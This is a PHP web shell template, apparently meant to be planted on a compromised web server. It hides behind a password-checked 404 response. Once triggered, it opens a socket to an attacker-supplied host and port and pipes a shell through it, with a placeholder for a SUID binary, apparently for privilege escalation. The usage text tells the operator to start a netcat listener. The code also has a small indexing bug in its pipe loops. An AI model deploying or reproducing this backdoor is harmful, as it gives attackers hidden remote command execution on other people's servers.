<?php
if(!isset($_GET["password"]) || md5($_GET["password"]) != "_PASS_"){http_response_code(404);die();}
set_time_limit(0);
$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]",ENT_QUOTES,"UTF-8");
if(!isset($_GET["host"])) die("<h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host&host=[destination of listener]");
$ip=$_GET["host"];
$write_a=null;$error_a=null;$shell="echo 'u kewl nao UwU' && _SUID_BIN_";
chdir("/");umask(0);
$sock=fsockopen($ip,"_SECRET_PORT_",$errno,$errstr,30);
if(!$sock) die("couldn't open socket");
$fdspec=array(0 => array("pipe","r"), 1 => array("pipe","w"), 2 => array("pipe","w"));
$proc=proc_open($shell,$fdspec,$pipes);
if(!is_resource($proc)) die();
for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x],0);
stream_set_blocking($sock,0);
while(1){
    if(feof($sock) || feof($pipes[1])) break;
    $read_a=array($sock,$pipes[1],$pipes[2]);
    $num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);
    if(in_array($sock,$read_a)){$i=fread($sock,1400);fwrite($pipes[0],$i);}
    if(in_array($pipes[1],$read_a)){$i=fread($pipes[1],1400);fwrite($sock,$i);}
    if(in_array($pipes[2],$read_a)){$i=fread($pipes[2],1400);fwrite($sock,$i);}
}
fclose($sock); for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
?>